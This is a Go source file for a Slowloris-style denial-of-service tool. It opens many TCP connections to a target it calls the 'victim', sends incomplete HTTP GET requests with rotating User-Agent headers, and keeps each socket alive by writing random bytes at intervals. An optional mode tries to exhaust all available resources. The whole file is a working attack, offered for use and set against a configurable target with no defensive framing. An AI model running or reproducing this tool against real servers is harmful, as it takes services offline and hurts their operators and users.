package main

import (
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"net"
	"net/url"
	"os"
	"strings"
	"time"
)

type attackParams struct {
	serverURL *url.URL
	maxConn   *uint64
	currConn  *uint64
	timeout   *uint64
	agents    []string
	duration  *uint64
	auto      *bool
}

type connection struct {
	payload *string
	id      int
	conn    net.Conn
}

func main() {
	attack := parseArguments()
	quit := make(chan bool)
	cons := int(*attack.maxConn)
	host := attack.serverURL.Hostname()
	port := attack.serverURL.Port()
	endpoint, tcperr := net.ResolveTCPAddr("tcp", host+":"+port)
	if tcperr != nil {
		log.Fatalf("%v\n", tcperr)
	}
	currConnections := uint64(0)
	attack.currConn = &currConnections

	defer func() {
		close(quit)
		log.Println("Exiting the program")
	}()

	i := 0
	for ; i <= cons; i++ {
		agent := attack.agents[rand.Intn(len(attack.agents))]

		connection, err := createConnection(endpoint, attack.serverURL.Path, agent, i, quit)
		if err != nil {
			switch err.Err.(type) {
			case *os.SyscallError:
				// os related errors, e.g.
				// connection refuse from the server, socket opening problems
				log.Println(err.Err)
				log.Println("Starting a new monitoring routine")
			case *net.DNSError:
				// if we reached this case, then most
				// probably the host does not exists
				log.Fatalln(err.Err)
			default:
				// should not reach here
				log.Fatalln("Unknown error, terminating the program")
			}

			break
		} else {
			(*attack.currConn)++
			go connection.start(attack.currConn, attack.timeout, quit)
		}
	}

	go monitor(attack, endpoint, i, quit)

	time.Sleep(time.Second * time.Duration(*attack.duration))
}

// starts a new routine that continuously sends packets to the server
// to keep the connection
func (m *connection) start(counter, timeout *uint64, quit chan bool) {
	log.Printf("Starting worker for #%d socket\n", m.id)

	defer func() {
		m.conn.Close()
		log.Printf("Stop sending random packets to #%d socket\n", m.id)
	}()

	log.Printf("Sending initial payload to #%d socket\n", m.id)
	packet := []byte(*m.payload)
	_, err := m.conn.Write(packet)
	if err != nil {
		log.Printf("Failed to send the initial packet to #%d socket: %v", m.id, err)
	}

	sleep := time.Second * time.Duration(*timeout)

	for {
		select {
		case <-quit:
			return
		default:
			time.Sleep(sleep)

			randPackets := make([]byte, 1)
			randPackets[0] = byte(rand.Intn(256))

			_, err = m.conn.Write(randPackets)
			if err != nil {
				log.Printf("Failed sending random packet to #%d socket:\n\t%v\n", m.id, err)
				(*counter)--
				return
			}

			log.Printf("Sent random packet to #%d socket\n", m.id)
		}
	}
}

// tries to create as much tcp connections as possible
func monitor(attack *attackParams, address *net.TCPAddr, id int, quit chan bool) {
	retry := time.Second * time.Duration(*attack.timeout)

	for {
		select {
		case <-quit:
			return
		default:
			log.Println("Trying to open a new socket from the monitor routine...")

			connection, err := createConnection(address, attack.serverURL.Path, attack.agents[rand.Intn(len(attack.agents))], id, quit)
			if err != nil && (*attack.maxConn >= *attack.currConn || *attack.auto) {
				time.Sleep(retry)
				continue
			} else {
				log.Printf("Successfully opened #%d socket\n", id)
			}
			(*attack.currConn)++
			go connection.start(attack.currConn, attack.timeout, quit)
			id++
		}
	}
}

func createConnection(address *net.TCPAddr, path, agent string, id int, quit chan bool) (*connection, *net.OpError) {
	payload := func() string {
		var headerPath string
		if path == "" {
			headerPath = "/"
		} else {
			headerPath = path
		}

		return fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nUser-Agent:%s\r\n", headerPath, address.IP.String(), agent)
	}()

	conn, err := net.DialTCP("tcp", nil, address)
	if err != nil {
		return nil, err.(*net.OpError)
	}

	// abandon any unsent data
	linerr := conn.SetLinger(0)
	if linerr != nil {
		return nil, linerr.(*net.OpError)
	}

	return &connection{&payload, id, conn}, nil
}

func parseArguments() *attackParams {
	server := flag.String("s", "http://localhost:8080", "The address of the victim")
	connectionsNr := flag.Uint64("c", 5, "The number of connections to establish with the victim")
	timeout := flag.Uint64("t", 10, "The time between sending packets in every active connection in seconds")
	agentsPath := flag.String("ap", "agents.txt", "The file name with varius User-Agent headers. Is optional")
	duration := flag.Uint64("d", 10*60, "The duration of the attack in seconds")
	auto := flag.Bool("a", false, "Take all resources available automatically")
	flag.Parse()

	if !strings.Contains(*server, "http://") && !strings.Contains(*server, "https://") {
		s := fmt.Sprintf("http://%s", *server)
		server = &s
	}

	victimURL, err := url.ParseRequestURI(*server)
	if err != nil {
		log.Fatalln(err)
	}

	var userAgents []string
	agents, err := ioutil.ReadFile(*agentsPath)
	if err != nil {
		defaultUserAgent := "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"
		log.Printf(`Failed to read the list of user agents
			Falling back to the default one
			Will use: %s`,
			defaultUserAgent)
		userAgents = append(userAgents, defaultUserAgent)
	} else {
		log.Println("Found the agents file")
		userAgents = strings.Split(string(agents), "\n")
	}

	attack := attackParams{
		serverURL: victimURL,
		maxConn:   connectionsNr,
		timeout:   timeout,
		agents:    userAgents,
		duration:  duration,
		auto:      auto,
	}

	return logSetup(&attack)
}

func logSetup(attack *attackParams) *attackParams {
	log.Printf("Attack will be performed on [%s]\n", attack.serverURL.String())
	log.Printf("The timeout between messages is [%d] seconds\n", *attack.timeout)
	log.Printf("The attack will last for [%d] seconds\n", *attack.duration)

	if *attack.auto {
		log.Println("Will try to use all available resources and establish as many connections as possible")
	} else {
		log.Printf("Will try to establish [%d] connections to the server\n", *attack.maxConn)
	}

	return attack
}
